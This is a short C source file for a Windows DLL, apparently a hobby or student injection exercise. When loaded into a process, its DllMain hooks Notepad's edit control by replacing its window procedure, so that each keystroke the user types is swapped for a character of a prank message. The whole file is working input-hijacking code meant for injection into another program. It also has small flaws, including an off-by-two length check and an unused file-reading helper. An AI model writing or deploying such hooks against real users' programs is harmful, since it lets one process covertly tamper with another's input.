#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
#include <stdio.h>
#include <string.h>

LONG_PTR previous_func = NULL;
int i = 0;
char dest[] = "Hello this is ethan i hack you! LOL";


char* read_line(char *str, int n, FILE *stream)
{
	char *ans = fgets(str, n, stream);
	if (ans == NULL)
		return NULL;
	int newlineIndex = strcspn(str, "\n");
	str[newlineIndex] = 0;
	return str;
}

void copy_file(char *dest) {

	FILE *fp = fopen("C:\\Users\\Ethan\\Desktop\\C\\TroySous_ETHAN\\hack.txt", "r");
	read_line(dest, 40, fp);
}

LRESULT CALLBACK WindowProc(
	_In_ HWND   hwnd,
	_In_ UINT   uMsg,
	_In_ WPARAM wParam,
	_In_ LPARAM lParam
)
{
	//MessageBoxW(NULL, L"3", L"myDLL", MB_OKCANCEL);
	char c;
	if (uMsg == WM_CHAR)
	{
		if (i != 37) {
			c = dest[i];
			wParam = c;
			i++;
		}
		else
			wParam = NULL;
	}
	//MessageBoxW(NULL, L"4", L"myDLL", MB_OKCANCEL);
	
	return CallWindowProcA(previous_func , hwnd, uMsg, wParam, lParam);
}

void fuckwindow() {
	HWND hparent = FindWindowExA(NULL,NULL, "Notepad", NULL );
	HWND hedit = FindWindowExA(hparent,NULL,"Edit",NULL);
	previous_func = GetWindowLongPtrA(hedit, GWLP_WNDPROC);
	//MessageBoxW(NULL, L"2", L"myDLL", MB_OKCANCEL);
	SetWindowLongPtrA(hedit, GWLP_WNDPROC,(LONG_PTR)WindowProc);
}


BOOL APIENTRY DllMain(
	_In_ HINSTANCE hinstDLL,
	_In_ DWORD     fdwReason,
	_In_ LPVOID    lpvReserved
) {
	if (fdwReason==DLL_PROCESS_ATTACH)
	{
		//MessageBoxW(NULL, L"HELLO", L"myDLL", MB_OK);

		fuckwindow();
	}
	

	return TRUE;
	
}
